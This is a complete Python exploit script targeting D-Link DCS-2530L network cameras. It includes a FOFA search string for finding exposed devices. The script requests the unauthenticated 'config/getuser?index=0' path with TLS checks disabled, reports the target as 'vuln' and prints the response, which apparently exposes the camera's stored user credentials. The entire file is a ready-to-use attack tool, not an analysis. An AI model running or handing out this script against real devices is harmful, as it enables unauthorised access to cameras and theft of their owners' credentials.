#!/usr/bin/python3
#fofa search: app="D_Link-DCS-2530L"
#Author Drunkmars

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

if(len(sys.argv) < 2):
	print("UseAge: python3 exploit.py url")
	print("Example: python3 exploit https://192.168.1.1/")
	exit()

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

target = sys.argv[1]
Payload = target + 'config/getuser?index=0'

headers = {
    "User-Agent": "Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3"
}

print("Attacking the target............")
print("================================")

response = requests.get(Payload,headers = headers,verify = False,timeout = 10)

if(response.status_code == 200 and 'name=' in response.text):
	print("[+]Target is vuln!")
	print(response.text)
else:
	print("[-]Target is not vuln!")
